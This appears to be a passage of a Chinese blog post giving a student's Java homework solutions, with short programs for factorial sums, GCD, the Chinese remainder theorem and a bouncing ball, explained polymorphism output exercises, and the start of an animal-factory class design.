    <content type="html"><![CDATA[<h2 id="作业一"><a href="#作业一" class="headerlink" title="作业一"></a><strong>作业一</strong></h2><ol><li>计算多项式1！+2！+3！…+n!，当多项式之和超过10000时停止，并输出累加之和以及n的值。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">factorial</span> </span>&#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;  </span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;  </span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">1</span>;  </span><br><span class="line">        <span class="keyword">int</span> next = <span class="number">0</span>;  </span><br><span class="line">        <span class="keyword">while</span> (next &lt;= <span class="number">10000</span>) &#123;  </span><br><span class="line">            sum = sum + fun(n);  </span><br><span class="line">            next = sum + fun(++n);  </span><br><span class="line">        &#125;  </span><br><span class="line">        System.out.printf(<span class="string">&quot;累加之和为 %d, 数字 n 为 %d\n&quot;</span>, sum, n-<span class="number">1</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;  </span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span> || n == <span class="number">0</span>)  </span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">        <span class="keyword">return</span> n * fun(n - <span class="number">1</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>2. 从标准输入端输入一个字符，判断字符是数字、还是西文字母还是其他的字符。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">judge</span> </span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;  </span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;  </span><br><span class="line">            Scanner scanner = <span class="keyword">new</span> Scanner(System.in);  </span><br><span class="line">            System.out.println(<span class="string">&quot;请输入一个字符以进行判断，输入Q结束程序：&quot;</span>);  </span><br><span class="line">            <span class="keyword">char</span> c = scanner.next().charAt(<span class="number">0</span>);  </span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;q&#x27;</span> || c == <span class="string">&#x27;Q&#x27;</span>)  </span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">            <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;z&#x27;</span> || c &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;Z&#x27;</span>)  </span><br><span class="line">                System.out.println(c + <span class="string">&quot;是一个西文字母&quot;</span>);  </span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;9&#x27;</span>)  </span><br><span class="line">                System.out.println(c + <span class="string">&quot;是一个数字&quot;</span>);  </span><br><span class="line">            <span class="keyword">else</span>  </span><br><span class="line">                System.out.println(c + <span class="string">&quot;是其他字符&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><ol start="3"><li>利用辗转相除法（欧几里得算法）求两个正整数的最大公约数</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Euclidean</span> </span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">Greatest_common_divisor</span><span class="params">(<span class="keyword">int</span> num1, <span class="keyword">int</span> num2)</span> </span>&#123;  </span><br><span class="line">        <span class="keyword">if</span> (num1 &lt; <span class="number">0</span> || num2 &lt; <span class="number">0</span>) &#123;  </span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">if</span> (num2 == <span class="number">0</span>) &#123;  </span><br><span class="line">            <span class="keyword">return</span> num1;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">while</span> (num1 % num2 != <span class="number">0</span>) &#123;  </span><br><span class="line">            <span class="keyword">int</span> numtemp = num1 % num2;  </span><br><span class="line">            num1 = num2;  </span><br><span class="line">            num2 = numtemp;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> num2;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">int</span> a,b;  </span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);  </span><br><span class="line">        System.out.print(<span class="string">&quot;输入第一个数字: &quot;</span>);  </span><br><span class="line">        a = scanner.nextInt();  </span><br><span class="line">        System.out.print(<span class="string">&quot;输入第二个数字: &quot;</span>);  </span><br><span class="line">        b = scanner.nextInt();  </span><br><span class="line">        <span class="keyword">int</span> ans= Greatest_common_divisor(a,b);  </span><br><span class="line">        System.out.println(<span class="string">&quot;最大公约数为 &quot;</span>+ ans);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p><img src="/img/a56790bda968120f437b243d1a76580b.png"></p><ol start="4"><li>假设一个数在1000到1100之间，那除以3结果余2,；除以5结果余3,；除以7结果余2（中国剩余定理），求此数。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Chinese_remainder_theorem</span> </span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1000</span>; i &lt;= <span class="number">1100</span>; i++)  </span><br><span class="line">            <span class="keyword">if</span> (i % <span class="number">3</span> == <span class="number">2</span> &amp;&amp; i % <span class="number">5</span> == <span class="number">3</span> &amp;&amp; i % <span class="number">7</span> == <span class="number">2</span>)  </span><br><span class="line">                System.out.println(i);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p><img src="/img/65cb9049e2667e84d16bf938c30fa639.png"></p><ol start="5"><li>小球从100米高度自由落下，每次触地后反弹到原来高度的一半，求第10次触地时经历的总路程以及第10次反弹高度</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ball</span> </span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;  </span><br><span class="line">        Scanner scanner =<span class="keyword">new</span> Scanner(System.in);  </span><br><span class="line">        System.out.print(<span class="string">&quot;输入高度: &quot;</span>);  </span><br><span class="line">        <span class="keyword">double</span> height = scanner.nextInt();  </span><br><span class="line">        System.out.print(<span class="string">&quot;输入次数: &quot;</span>);  </span><br><span class="line">        <span class="keyword">int</span> n = scanner.nextInt();  </span><br><span class="line">        <span class="keyword">double</span> sum = <span class="number">0</span>;  </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i&lt;=n;i++)&#123;  </span><br><span class="line">            sum = height+height/<span class="number">2</span>+sum;<span class="comment">//一次落地距离+弹起距离+已经过路程  </span></span><br><span class="line">            height/=<span class="number">2</span>;  </span><br><span class="line">            System.out.printf(<span class="string">&quot;第 %d 次弹跳高度为: %f米\n&quot;</span>,i,height);  </span><br><span class="line">        &#125;  </span><br><span class="line">        System.out.println(<span class="string">&quot;**************************&quot;</span>);  </span><br><span class="line">        sum-=height;  </span><br><span class="line">        System.out.println(<span class="string">&quot;共经过&quot;</span>+sum+<span class="string">&quot;米&quot;</span>);  </span><br><span class="line">        System.out.println(<span class="string">&quot;第10次弹起的高度为：&quot;</span>+height+<span class="string">&quot;米&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p><img src="/img/347bc5dd68d92ffabcdfb6ec45e52336.png"></p><h2 id="作业二"><a href="#作业二" class="headerlink" title="作业二"></a>作业二</h2><h3 id="读程序，写结果："><a href="#读程序，写结果：" class="headerlink" title="读程序，写结果："></a>读程序，写结果：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">Show</span><span class="params">(D obj)</span> </span>&#123;<span class="keyword">return</span> (<span class="string">&quot;A and D&quot;</span>);&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">Show</span><span class="params">(A obj)</span> </span>&#123;<span class="keyword">return</span> (<span class="string">&quot;A and A&quot;</span>);&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">Show</span><span class="params">(B obj)</span> </span>&#123;<span class="keyword">return</span> (<span class="string">&quot;B and B&quot;</span>);&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">Show</span><span class="params">(A obj)</span> </span>&#123;<span class="keyword">return</span> (<span class="string">&quot;B and A&quot;</span>);&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">extends</span> <span class="title">B</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">Show</span><span class="params">(C obj)</span> </span>&#123;<span class="keyword">return</span> (<span class="string">&quot;C and C&quot;</span>);&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">Show</span><span class="params">(B obj)</span> </span>&#123;<span class="keyword">return</span> (<span class="string">&quot;C and B&quot;</span>);&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> <span class="keyword">extends</span> <span class="title">B</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">Show</span><span class="params">(D obj)</span> </span>&#123;<span class="keyword">return</span> (<span class="string">&quot;D and D&quot;</span>);&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">Show</span><span class="params">(B obj)</span> </span>&#123;<span class="keyword">return</span> (<span class="string">&quot;D and B&quot;</span>);&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">mainTest</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">A a1 = <span class="keyword">new</span> A();</span><br><span class="line">A a2 = <span class="keyword">new</span> B();</span><br><span class="line">B b = <span class="keyword">new</span> B();</span><br><span class="line">C c = <span class="keyword">new</span> C();</span><br><span class="line">D d = <span class="keyword">new</span> D();</span><br><span class="line">        System.out.println(a1.Show(b));</span><br><span class="line">        System.out.println(a1.Show(c));</span><br><span class="line">System.out.println(a1.Show(d));</span><br><span class="line">System.out.println(a2.Show(b));</span><br><span class="line">System.out.println(a2.Show(c));</span><br><span class="line">System.out.println(a2.Show(d));</span><br><span class="line">System.out.println(b.Show(b));</span><br><span class="line">System.out.println(b.Show(c));</span><br><span class="line">System.out.println(b.Show(d));</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h4><p>第一个输出：B自动转换为父类A，因此输出A and A；</p><p>第二个输出：与上面同理，自动转换为父类A，因此输出A and A；</p><p>第三个输出：调用A类的第一个Show函数，输出A and A；</p><p>第四个输出：首先因为引用类型为A类，所以系统想要执行A类的方法，但A类并没有找到类型匹配的方法，于是将参数b自动转化为父类，执行Show(A obj)方法，又因为a1实际指向了B类的对象，子类B重写了这个方法，因此优先执行子类的方法，于是输出B and A；</p><p>第五个输出：与上面同理，只是又将参数c多转化了一步，输出B and A；</p><p>第六个输出：与第四个类似，由于a2的引用类型是A类，而class A包含Show(D obj)方法，因此直接输出A and D；</p><p>第七个输出：直接调用B的Show(B obj)方法，因此输出B and B；</p><p>第八个输出：因为没有匹配的方法，因此参数c自动转换为父类B，因此调用Show(B obj)方法，输出B and B；</p><p>第九个输出：因为B的父类A类中方法Show(D obj)匹配，因此调用此方法输出A and D。</p><h4 id="答案："><a href="#答案：" class="headerlink" title="答案："></a>答案：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">A and A  </span><br><span class="line">A and A  </span><br><span class="line">A and D  </span><br><span class="line">B and A  </span><br><span class="line">B and A  </span><br><span class="line">A and D  </span><br><span class="line">B and B  </span><br><span class="line">B and B  </span><br><span class="line">A and D  </span><br></pre></td></tr></table></figure><h3 id="读程序，写结果：-1"><a href="#读程序，写结果：-1" class="headerlink" title="读程序，写结果："></a>读程序，写结果：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> String name = <span class="string">&quot;base&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Base</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        tellName();&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">tellName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Base tell name: &quot;</span> + name); &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dervied</span> <span class="keyword">extends</span> <span class="title">Base</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name = <span class="string">&quot;dervied&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Dervied</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        tellName();&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">tellName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Dervied tell name: &quot;</span> + name);&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">new</span> Dervied();    </span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="分析：-1"><a href="#分析：-1" class="headerlink" title="分析："></a>分析：</h4><p>当主函数语句new Dervied();执行时，首先初始化Dervied类，但又因为Dervied类继承了Base类，因此先初始化Base类。Base类的private变量name被赋初值“base”，然后进入构造函数执行tellName()，但因为子类Base重写了该方法，因此实际上进入子类的tellName()函数执行，但是此时子类的name仍未初始化，因此为null，输出“Dervied tell name: null”。然后开始子类初始化，Dervied类的private变量name被赋初值“dervied”，然后执行构造函数tellName()，输出“Dervied tell name: dervied”。</p><h4 id="答案：-1"><a href="#答案：-1" class="headerlink" title="答案："></a>答案：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Dervied tell name: null  </span><br><span class="line">Dervied tell name: dervied  </span><br></pre></td></tr></table></figure><h3 id="练习3：Example2：生成动物"><a href="#练习3：Example2：生成动物" class="headerlink" title="练习3：Example2：生成动物"></a>练习3：Example2：生成动物</h3><p>首先来看Animal类，这是一个抽象类，其方法在后面的子类进行实现。包括getAnimalCount()用来获取每一类动物的数量；Increaseanimals()用于增加每类动物的个数；静态变量sumall用于统计所有动物的总数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">getAnimalCount</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">Increaseanimals</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> sumall = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是AnimalFactory类，用于生成动物。首先构造动物的静态对象，然后在getAnimal()函数中分别调用动物子类的两个函数即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AnimalFactory</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> Tiger tiger = <span class="keyword">new</span> Tiger();</span><br><span class="line">    <span class="keyword">static</span> Rabbit rabbit = <span class="keyword">new</span> Rabbit();</span><br><span class="line">    <span class="keyword">static</span> Bear bear = <span class="keyword">new</span> Bear();</span><br><span class="line">    <span class="keyword">static</span> Panda panda = <span class="keyword">new</span> Panda();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Animal <span class="title">getAnimal</span><span class="params">(String type)</span></span>&#123;</span><br><span class="line">        Animal.sumall++;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;tiger&quot;</span>.equalsIgnoreCase(type)) &#123;</span><br><span class="line">            tiger.Increaseanimals();</span><br><span class="line">            tiger.getAnimalCount();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;rabbit&quot;</span>.equalsIgnoreCase(type))&#123;</span><br><span class="line">            rabbit.Increaseanimals();</span><br><span class="line">            rabbit.getAnimalCount();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;bear&quot;</span>.equalsIgnoreCase(type))&#123;</span><br><span class="line">            bear.Increaseanimals();</span><br><span class="line">            bear.getAnimalCount();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;panda&quot;</span>.equalsIgnoreCase(type))&#123;</span><br><span class="line">            panda.Increaseanimals();</span><br><span class="line">            panda.getAnimalCount();</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">Animal.sumall--;</span><br><span class="line">            System.out.println(<span class="string">&quot;ERROR! NO SUCH ANIMAL! &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是动物类，分别继承了Animal类。因为每个动物类仅有类名不同，我们以Bear类和Rabbit类为例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Bear</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Bear</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Increaseanimals</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getAnimalCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;The current total number of &quot;</span> + <span class="keyword">this</span>.getClass().getName().substring(<span class="number">12</span>) + <span class="string">&quot;(s) is: &quot;</span> + <span class="keyword">this</span>.count);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是Rabbit类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Rabbit</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Rabbit</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Increaseanimals</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getAnimalCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;The current total number of &quot;</span>+<span class="keyword">this</span>.getClass().getName().substring(<span class="number">12</span>)+<span class="string">&quot;(s) is: &quot;</span> + <span class="keyword">this</span>.count);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到两个动物类仅有类名不同，其他代码均可复用，包括输出语句，这也意味着加入新的动物极其简单，只需要复制一份文件然后修改类名即可，后面做一下演示。</p><p>最后看一下主类，主要是while循环、提示信息以及输入输出流：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Title</span>：AnimalFactory</span></span><br><span class="line"><span class="comment"> * <span 